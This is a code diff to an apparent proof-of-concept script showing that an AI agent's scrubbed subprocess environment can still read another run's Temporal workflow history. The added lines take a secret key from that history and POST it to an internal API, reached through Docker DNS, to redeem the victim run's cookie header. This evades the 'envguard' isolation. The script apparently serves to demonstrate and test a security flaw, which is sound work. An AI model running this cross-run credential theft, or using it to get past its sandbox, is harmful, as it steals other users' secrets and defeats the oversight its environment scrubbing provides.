@@ -7,11 +7,13 @@ import os
 import sys
 
 from temporalio.client import Client
+from urllib.request import Request, urlopen
 from src.ai.envguard import strip_secret_env
 
 
 async def main() -> None:
     victim_run_id = sys.argv[1]
+    api_port = int(sys.argv[2])
 
     # Match the environment handed to agent CLI subprocesses.
     agent_env = strip_secret_env(dict(os.environ))
@@ -40,13 +42,27 @@ async def main() -> None:
     payload = json.loads(payload_bytes.decode("utf-8"))
     key = payload["secrets"]["key"]
 
+    # The internal API base URL is deliberately scrubbed from the process
+    # environment. The agent reaches the listener through Docker DNS instead.
+    body = json.dumps({"key": key, "want": ["cookie_header"]}).encode()
+    request = Request(
+        f"http://api:{api_port}/internal/v1/runs/{victim_run_id}/secrets",
+        data=body,
+        headers={"Content-Type": "application/json"},
+        method="POST",
+    )
+    with urlopen(request, timeout=10) as response:
+        status = response.status
+        redemption = json.loads(response.read().decode())
+
     print(json.dumps({
         "workflow_enumeration": True,
         "history_read": True,
         "temporal_address_survived_envguard": True,
         "internal_api_url_removed_by_envguard": True,
         "victim_run_id": victim_run_id,
-        "redeemed_key_from_history": key,
+        "redemption_http_status": status,
+        "redeemed_secrets": redemption.get("secrets", {}),
     }))
 
 
